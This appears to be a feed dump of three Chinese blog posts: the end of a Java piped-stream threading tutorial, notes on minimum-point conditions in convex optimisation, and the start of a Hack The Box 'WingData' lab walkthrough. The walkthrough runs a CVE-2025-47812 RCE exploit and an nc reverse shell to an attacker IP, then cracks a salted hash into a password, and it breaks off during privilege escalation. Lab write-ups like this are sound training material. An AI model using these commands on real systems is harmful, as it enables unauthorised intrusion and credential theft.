}\n</code></pre>\n<p>然后，当消费者线程再次执行</p>\n<pre><code>//标题3.2中的代码片段\ninput.read(b, 0, b.length)\n</code></pre>\n<p>从缓冲区（byte[]数组）中读数据到自己创建的byte[]数组中时，由于此时in（写指针）=-1，并且当下图中的其它5个条件都不成立时，唤醒执行了</p>\n<pre><code>input.wait()\n</code></pre>\n<p>的生产者线程，然后当前这个正在从缓冲区(byte[]数组)中读数据的消费者线程执行wait 1000ms ，如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>⑥、当生产者线程被消费者线程执行的</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>唤醒之后，会再次通过不断的压栈来完成函数之间的调用，再次执行PipedInputStream.class::receive(byte b[], int off, int len)函数来对缓冲区（byte[]数组）进行填充，并且先在自己的线程栈中先更新in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程（Thread）对象 如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>当生产者线程对缓冲区（byte[]数组）填充完成之后，再执行标题3.2中的代码</p>\n<pre><code>input.wait();\n</code></pre>\n<p>这行代码会释放锁并让生产者线程进入无限等待，直到消费者线程consumer执行notifyAll()函数来唤醒当前这个生产者线程。在这之前，生产者线程会将自己线程栈中的in（写指针）=17，out（读指针）=0，writeSide=当前这个生产者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>⑦、消费者线程在第⑤步执行了</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>在等待了1000ms之后，消费者线程会自动唤醒继续执行，此时自己线程栈中的in（写指针）= -1，out（读指针）= 17已经被第⑥步中的生产者线程修改为in（写指针）=17，out（读指针）=0（生产者线程不会直接修改消费者线程栈中的变量，生产者线程会先将自己线程栈中in（写指针），out（读指针）变量的值修改到主内存中，然后消费者线程会自己将主内存中的这2个变量值刷新到消费者自己的线程栈中），然后执行PipedInputStream::read()函数（试探性的读取1个字节）和PipedInputStream::read(byte b[], int off, int len)函数（读取剩余其它的字节）将步骤⑥中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>附言：最终消费者线程也会将自己线程栈中的in（写指针）= -1，out（读指针）= 17，writeSide=当前这个消费者线程，这3个变量更新到主内存（也就是堆）中的PipedInputStream对象中。</p>\n</blockquote>\n<p>由于，本次消费者线程从缓冲区（byte[]数组）中读数据的过程是从步骤⑤中自动唤醒继续执行的，所以，本次消费者线程从缓冲区（byte[]数组）中读取数据到消费者线程中自己创建的byte[]数组中时，花费了1017ms：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>接下来，当消费者线程将步骤⑥中生产者线程写入到缓冲区（byte[]数组）中的17个字节读取出来以后（通过System.arraycopy()函数复制到了消费者线程中自己创建的byte[]数组中），消费者线程会遍历从缓冲区读到的这个byte[]数组，来处理这些数据，如下所示（标题3.2中的代码片段）：</p>\n<pre><code>                   //标题3.2中的代码片段\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//模拟处理字节数据\n                  }\n</code></pre>\n<p>然后，当消费者线程再次执行</p>\n<pre><code>//标题3.2中的代码片段\ninput.read(b, 0, b.length)\n</code></pre>\n<p>从缓冲区（byte[]数组）中读数据到自己创建的byte[]数组中时，由于此时in（写指针）=-1，并且当下图中的其它5个条件都不成立时，唤醒执行了</p>\n<pre><code>input.wait()\n</code></pre>\n<p>的生产者线程，然后当前这个正在从缓冲区(byte[]数组)中读数据的消费者线程执行wait 1000ms ，如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>⑧、当生产者线程被消费者线程执行的</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>唤醒之后，会跳出for循环，结束生产者线程的生命周期，之后，该线程对象会被操作系统回收。<br />\n⑨、消费者线程在第⑦步执行了</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>在等待了1000ms之后，消费者线程会自动唤醒继续执行，此时自己线程栈中的in（写指针）= -1，out（读指针）= 17，并且从</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>的代码之后，继续执行，执行过程如下（从下图的紫色流程继续执行）：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>在执行了2个循环后，直到int trials = 0时，执行到判断(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)这个条件时就会为true（下图的红色流程）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>然后，抛出了一个IOException(\"Pipe broken\")，因此，可以得出int trials变量的含义：这个变量是一个多次检测的策略变量，当生产者线程没有关闭了与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）时，并且writeSide变量指向的当前生产者线程已经被操作系统回收时（此时当前生产者线程对象的isAlive()函数会返回false），消费者线程会抛出1个IOException(\"Pipe broken\")，并结束while循环，进而结束消费者线程的生命周期。之后，该线程对象也会被操作系统回收。如下图所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"322怎样防止321中第步的生产者线程抛出ioexceptionpipe-broken\">3.2.2、怎样防止3.2.1中第⑨步的生产者线程抛出IOException(\"Pipe broken\")</h6>\n<p>  回顾3.2.1中第⑨步中的消费者线程抛出IOException(\"Pipe broken\")的产生过程：当执行到判断(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)这个条件时就会为true（下图的红色流程）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>那么，使用者就可以将上图中红色流程的前一步变成true即可，如下代码所示（只修改了生产者线程中的代码，消费者线程中的代码没有变化）：</p>\n<pre><code>package com.chelong.pipe;\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n   public static void main(String[] args) throws IOException, InterruptedException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      //生产者线程\n      Thread producer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               for (int i = 0; i &lt; 3; i++) {\n                  synchronized (input) {\n//                    input.wait();\n                     output.write(\"Hello world, pipe!\".getBytes());\n                     input.wait();//释放锁并无限等待，直到消费者线程thread2执行notifyAll()函数来唤醒当前阻塞\n                  }\n               }\n            } catch (Exception e) {\n               e.printStackTrace();\n            } finally {\n               try {\n                  if (output != null) output.close();//调用close()函数关闭生产者对象\n               } catch (IOException e) {\n                  e.printStackTrace();\n               }\n            }\n         }\n      }, \"生产者线程\");\n\n      //消费者线程\n      Thread consumer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               byte[] b = new byte[1024];//1KB\n               int readBytes = -1;\n               long lastTime = System.currentTimeMillis();\n               while ((readBytes = input.read(b, 0, b.length)) != -1) {\n                  long curTime = System.currentTimeMillis();\n                  System.out.print(Thread.currentThread().getName() + \"本次读取花费时间：\" + (curTime - lastTime) + \"ms，读到的数据是：\");\n                  lastTime = curTime;\n                  for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//模拟处理字节数据\n                  }\n                  System.out.println();\n               }\n            } catch (IOException e) {\n               e.printStackTrace();\n            }\n         }\n      }, \"消费者线程\");\n      producer.start();//生产者线程启动\n      consumer.start();//消费者线程启动\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  通过PipedOutputStream.class::close()的源码可以看到这样修改后消费者线程不再抛出IOException(\"Pipe broken\")原因：<br />\nPipedOutputStream.class（生产者类）的源码</p>\n<pre><code>package java.io;\n\nimport java.io.*;\n\npublic\nclass PipedOutputStream extends OutputStream {\n    ...省略部分代码...\n    //关闭这个PipedOutputStream（生产者），这个PipedOutputStream（生产者）不能再向与它相关联的PipedInputStream（消费者）中的缓冲区（byte[]数组）写入字节数据\n    public void close()  throws IOException {\n        if (sink != null) {\n            sink.receivedLast();//调用PipedInputStream.class::receivedLast()函数\n        }\n    }\n}\n</code></pre>\n<p>PipedInputStream .class（消费者类）的源码</p>\n<pre><code>package java.io;\n\npublic class PipedInputStream extends InputStream {\n    //标记符：true表示与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）已经关闭，反之，反之\n    boolean closedByWriter = false;\n    ...省略部分代码...\n    //关闭与这个 PipedInputStream （消费者）相关联的PipedOutputStream（生产者）\n    synchronized void receivedLast() {\n        closedByWriter = true;//关闭后消费者再从缓冲区（byte[]）数组中读取字节数据时，会返回-1，不会抛出IOException了\n        notifyAll();//唤醒所有消费者线程\n    }\n    ...省略部分代码...\n</code></pre>\n<h4 id=\"四多个线程向pipedoutputstream生产者写字节数据多个线程从pipedinputstream消费者读取字节数据的过程\">四、多个线程向PipedOutputStream（生产者）写字节数据，多个线程从PipedInputStream（消费者）读取字节数据的过程</h4>\n<p>  略（待补充）</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 22:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Carey-ccl\">Carey_ccl</a>&nbsp;\n阅读(<span id=\"post_view_count\">34</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "凸优化数学基础笔记（五）：极小值点的判定条件",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19625407",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19625407\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 22:06\">\n    <span>凸优化数学基础笔记（五）：极小值点的判定条件</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        函数f(X)在局部极小值点应满足什么条件？反之，满足什么条件的是局部极小点?这就是凸优化的基本问题。下面针对多元函数的情形给出各类极小值点的定义。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>​\t函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在局部极小值点应满足什么条件？反之，满足什么条件的是局部极小点?这就是凸优化的基本问题。下面针对多元函数的情形给出各类极小值点的定义。</p>\n<p>​\t<strong>定义 5.1</strong> 对于任意给定的实数<span class=\"math inline\">\\(\\forall \\delta&gt;0\\)</span>，满足不等式 <span class=\"math inline\">\\(||\\mathbf{X}-\\mathbf{X}_0||&lt;\\delta\\)</span> （<span class=\"math inline\">\\(\\mathbf{X,X_0}\\in\\mathbf{R}^{n}\\)</span>）的集合称为点 <span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 的领域，记为：</p>\n<p></p><div class=\"math display\">\\[N(\\mathbf{X}_0,\\delta)=\\{\\mathbf{X}|\\space||\\mathbf{X}-\\mathbf{X}_0||&lt;\\delta,\\delta&gt;0\\} \\tag{1}\n\\]</div><p></p><p>​\t<strong>定义 5.2</strong> 设 <span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq\\mathbf{R}^n\\rightarrow\\mathbf{R}\\)</span>，若存在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in\\mathbf{D}\\)</span> 和正数<span class=\"math inline\">\\(\\delta&gt;0\\)</span>，<span class=\"math inline\">\\(\\forall \\mathbf{X}\\in{N(\\mathbf{X}^{*},\\delta)}\\cap\\mathbf{D}\\)</span> 都有<span class=\"math inline\">\\(f(\\mathbf{X}^*)\\leq f(\\mathbf{X})\\)</span> ，则称<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 局部极小值点（非严格）。</p>\n<p>​\t<strong>定义5.3</strong>  设 <span class=\"math inline\">\\(f:\\mathbf{D} \\subseteq{\\mathbf{R}^n}\\rightarrow{\\mathbf{R}}\\)</span> ，若存在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}}\\)</span>和正数<span class=\"math inline\">\\(\\delta&gt;0\\)</span>，<span class=\"math inline\">\\(\\forall {\\mathbf{X}}\\in{N(\\mathbf{X}^{*},\\delta)}\\cap\\mathbf{D}\\)</span> 且 <span class=\"math inline\">\\(\\mathbf{X}\\neq{\\mathbf{X}^{*}}\\)</span> ，都有<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ，则称<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的严格局部极小值点。</p>\n<p>​\t<strong>定义5.4</strong> 设<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n}\\rightarrow\\mathbf{R}^1\\)</span>，若存在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}},\\forall \\mathbf{X}\\in{\\mathbf{D}}\\)</span> 都有<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ，则称<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 上的全局极小值（非严格）。</p>\n<p>​\t<strong>定义5.5</strong> 设<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n\\rightarrow{\\mathbf{R}^1}}\\)</span> ，若存在点 <span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}}\\)</span> ，<span class=\"math inline\">\\(\\forall \\mathbf{X}\\in{\\mathbf{D}}\\)</span> 但 <span class=\"math inline\">\\(\\mathbf{X}\\neq \\mathbf{X}^*\\)</span> ,都有<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ，则称<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 上的严格全局极小值点。</p>\n<p>​\t由于以上定义看到，<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<strong>局部极小值点</strong>，是指在以下<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为中心的一个领域中<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 处取得最小的值；而<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<strong>全局极小值点</strong>，是指在定义域<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 中<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 处取得最小的值。全局极小值点可能在某个局部极小值点，也可能在<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的边界上取得。</p>\n<p>​        由此，实际问题上通常是求取全局极小值点，但到目前为止，最优化中绝大多数方法都是求局部极小值点的，解决这一矛盾的一种方法是求出所有的局部极小值点，再求出全局极小值点。</p>\n<p>​\t<strong>定 理 5.1</strong> 设<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq {\\mathbf{R}^n}\\rightarrow\\mathbf{R}^1\\)</span> 具有连续的一阶偏导数。若<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的局部极小值点并且是<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的内点，则</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}_{n\\times{1}} \\tag{2}\n\\]</div><p></p><p><strong>证 明</strong>：设<span class=\"math inline\">\\(\\mathbf{e}\\)</span> 是任意单位向量，由于<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span>是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的局部极小值点，所以存在<span class=\"math inline\">\\(\\delta&gt;0\\)</span>，当<span class=\"math inline\">\\(|t|&lt;\\delta\\)</span>或<span class=\"math inline\">\\(\\mathbf{X}^{*}+t\\mathbf{e}\\in{N(\\mathbf{X}^{*},\\delta)}\\)</span> 时总有</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}^{*}+t\\mathbf{e})\\geq f(\\mathbf{X}^{*}) \\tag{3}\n\\]</div><p></p><p>引入辅助一元函数<span class=\"math inline\">\\(\\phi(t)=f(\\mathbf{X}^*+t\\mathbf{e})\\)</span>，此时，由式（3）可得，<span class=\"math inline\">\\(\\phi(t)\\geq\\phi(0)\\)</span>。 由于<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的内点，所以与它对应的<span class=\"math inline\">\\(t=0\\)</span>是<span class=\"math inline\">\\(\\phi(t)\\)</span> 的局部极小值点。又根据一元函数极小值点的必要条件，得到<span class=\"math inline\">\\(\\phi^{\\prime}(t)=0\\)</span> 即利用梯度性质得到<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X})}^T\\mathbf{e}=0\\)</span>。再由单位向量<span class=\"math inline\">\\(\\mathbf{e}\\)</span> 的任意性可得，<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}\\)</span>。</p>\n<p>​\t这里式（2）仅仅是<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的局部极小值点的必要条件，而不是充分条件，例如 <span class=\"math inline\">\\(f(x_1,x_2)=x_1x_2\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}^{*}=[0,0]^T\\)</span> 处的梯度为<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^*)}=[0,0]^T\\)</span>, 但是<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<strong>双曲面的鞍点</strong>，而不是极小值点。</p>\n<p>​\t<strong>定 义5.6</strong>  设<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^{n}}\\rightarrow\\mathbf{R}^{1}\\)</span> 具有连续二阶偏导数，<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的一个内点，若<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X^*})}=0\\)</span>，则称<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> <strong>驻点</strong>。</p>\n<p>​\t<strong>定 理 5.2</strong>  设<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n\\rightarrow{\\mathbf{R^{1}}}}\\)</span> 具有连续二阶偏导数，<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(\\mathbf{D}\\)</span> 的一个内点，若<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=0\\)</span> ,并且<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^{*})\\)</span>是正定的，则<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的严格极小值点。</p>\n<p><strong>证 明：</strong> 因为<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^*)\\)</span> 是正定矩阵，则必存在<span class=\"math inline\">\\(\\lambda&gt;0\\)</span>,使得对于所有<span class=\"math inline\">\\(\\mathbf{P}\\in\\mathbf{R}^n\\)</span>都有</p>\n<p></p><div class=\"math display\">\\[\\mathbf{P}^T\\nabla^2f(\\mathbf{X}^{*})\\mathbf{P}&gt;\\lambda||\\mathbf{P}||^2 \\tag{4}\n\\]</div><p></p><p>(其参看高等代数二次型理论)。现在将<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span>在点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 处按照Taylor 展开的，并注意到<span class=\"math inline\">\\(\\nabla f(\\mathbf{X}^*)=0\\)</span>, 于是可得：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\nf(\\mathbf{X})-f(\\mathbf{X}^{*})&amp;=\\frac{1}{2}(\\mathbf{X}-\\mathbf{X^*})^T\\nabla^2f(\\mathbf{X}^*)(\\mathbf{X}-\\mathbf{X}^{*})+o(||\\mathbf{X}-\\mathbf{X}^{*}||^2)\\\\\n&amp;\\geq \\frac{1}{2}||\\mathbf{X}-\\mathbf{X}^{*}||^2+o(||\\mathbf{X}-\\mathbf{X}^{*}||^2)\n\\end{aligned}\n\\tag{5}\n\\]</div><p></p><p>当其<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 充分接近<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> （但<span class=\"math inline\">\\(\\mathbf{X}\\neq \\mathbf{X}^{*}\\)</span>） 时，上式左端的符号取决于右端的第一项，因此，<span class=\"math inline\">\\(f(\\mathbf{X})&gt;f(\\mathbf{X}^{*})\\)</span> 。</p>\n<p>​\t一般来说，这个定理具备理论意义。因为对于复杂的目标函数，Hessian矩阵不易求得，它的正定性就更难判定了。</p>\n<p>​\t<strong>定理 5.3</strong> 若多元函数在其极小点处的<span class=\"math inline\">\\(Hessian\\)</span> 矩阵是正定的，则它在这个点附近的等值面近似地呈现为同心椭球面簇。</p>\n<p><strong>证 明：</strong>设<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是多元函数的极小点，并设<span class=\"math inline\">\\(f(\\mathbf{X})=\\gamma\\)</span> 是充分靠近极小点<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 的一个等值面，即<span class=\"math inline\">\\(||\\mathbf{X}-\\mathbf{X}^{*}||\\)</span>充分小。把<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 在<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 点展开Taylor表达式，即</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\nf(\\mathbf{X})=f(\\mathbf{X}^{*})+\\nabla{f(\\mathbf{X}^{*})^{T}}(\\mathbf{X}-\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^*)(\\mathbf{X}-\\mathbf{X}^{*})+o(||\\mathbf{X}-\\mathbf{X}^*||^2)   \n\\end{aligned}\n\\tag{6}\n\\]</div><p></p><p>右端第二项因<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是极小值点有<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}\\)</span> 而消失。如果略去高阶小项，那么</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})\\approx f(\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})+O(||\\mathbf{X}-\\mathbf{X}^{*}||^2) \\tag{7}\n\\]</div><p></p><p>又因为<span class=\"math inline\">\\(f(\\mathbf{X})=\\gamma\\)</span> ，所以得到如下近似等式：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})=\\gamma \\tag{8}\n\\]</div><p></p><p>其中<span class=\"math inline\">\\(f(\\mathbf{X}^{*})\\)</span>为已知常量 ，整理可得：</p>\n<p></p><div class=\"math display\">\\[(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})=2(\\gamma-f(\\mathbf{X}^{*}))=constant \\tag{9}\n\\]</div><p></p><p>按假设<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^{*})\\)</span> 正定，由二次型理论可知，式（9）是以<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为中心的椭球面方程。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 22:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\n阅读(<span id=\"post_view_count\">50</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【渗透测试】HTB Season10 WingData 全过程wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19625276",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19625276\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 20:05\">\n    <span>【渗透测试】HTB Season10 WingData 全过程wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"wingdata\">WingData</h1>\n<h2 id=\"信息收集\">信息收集</h2>\n<p><img alt=\"image-20260219182401835\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200443486-1691206510.png\" /></p>\n<p><img alt=\"image-20260219182537800\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444147-1082259586.png\" /></p>\n<p>得到一个ftp.wingdata.htb，也将这个加上</p>\n<p><img alt=\"image-20260219182636761\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444607-2041651593.png\" /></p>\n<p>Wing FTP Server v7.4.3</p>\n<p>通过搜寻cve是 CVE-2025-47812</p>\n<h2 id=\"漏洞利用cve-2025-47812\">漏洞利用（CVE-2025-47812）</h2>\n<p><a href=\"https://github.com/4m3rr0r/CVE-2025-47812-poc\" rel=\"noopener nofollow\" target=\"_blank\">4m3rr0r/CVE-2025-47812-poc: Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812)</a></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"whoami\" -v\n</code></pre>\n<p><img alt=\"image-20260219183211504\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444925-1620471614.png\" /></p>\n<p><strong>然后反弹shell</strong></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"nc 10.10.16.5 8888 -e /bin/sh\" -v\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>\n<p><img alt=\"image-20260219183719631\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445289-1452625655.png\" /></p>\n<p>然后在<code>/opt/wftpserver/Data/1/users</code>下的wacky.xml获得用户加密凭据</p>\n<p><img alt=\"image-20260219184040177\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445708-1521256185.png\" /></p>\n<pre><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP\n</code></pre>\n<p><strong>爆破hash(WingFTP 使用SHA256算法，并使用盐值“WingFTP”为加密方式)</strong></p>\n<pre><code class=\"language-kotlin\">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img alt=\"image-20260219184927089\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446045-1809595022.png\" /></p>\n<p>得到密码<code>!#7Blushing^*Bride5</code></p>\n<p>wacky/c</p>\n<p><strong>然后ssh连接</strong></p>\n<p><img alt=\"image-20260219185219510\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446347-1318255688.png\" /></p>\n<p>得到user.txt</p>\n<h2 id=\"权限提升\">权限提升</h2>\n<p>先sudo -l看一下</p>\n<p><img alt=\"image-20260219185311322\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446644-1829574816.png\" /></p>\n<p>可以看到有一个py脚本</p>\n<p>我们去看一下</p>\n<pre><code>cat /opt/backup_clients/restore_backup_clients.py\n</code></pre>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\nimport tarfile\nimport os\nimport sys\nimport re\nimport argparse\n\nBACKUP_BASE_DIR = \"/opt/backup_clients/backups\"\nSTAGING_BASE = \"/opt/backup_clients/restored_backups\"\n\ndef validate_backup_name(filename):\n    if not re.fullmatch(r\"^backup_\\d+\\.tar$\", filename):\n        return False\n    client_id = filename.split('_')[1].rstrip('.tar')\n    return client_id.isdigit() and client_id != \"0\"\n\ndef validate_restore_tag(tag):\n    return bool(re.fullmatch(r\"^[a-zA-Z0-9_]{1,24}$\", tag))\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Restore client configuration from a validated backup tarball.\",\n        epilog=\"Example: sudo %(prog)s -b backup_1001.tar -r restore_john\"\n    )\n    parser.add_argument(\n        \"-b\", \"--backup\",\n        required=True,\n        help=\"Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, \"\n             \"where 